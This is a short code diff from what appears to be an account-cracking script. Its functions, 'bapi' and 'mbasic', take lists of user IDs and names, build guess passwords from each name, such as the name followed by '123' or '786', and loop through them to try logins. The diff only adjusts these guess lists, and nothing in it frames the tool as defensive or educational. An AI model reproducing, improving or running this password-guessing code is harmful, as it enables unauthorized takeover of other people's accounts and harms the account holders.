@@ -291,7 +291,7 @@ def bapi(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [ ludostar1, name+"123", name+"1234", name+"12345" ]
+		pwx = [name, name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
@@ -336,9 +336,9 @@ def mbasic(user):
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"1", name+"1234567" ]
+		pwx = [ name+"1", name+"12345" ]
 	else:
-		pwx = [ name+"786", name+"123456" ]
+		pwx = [ name+"0786", name+"1" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
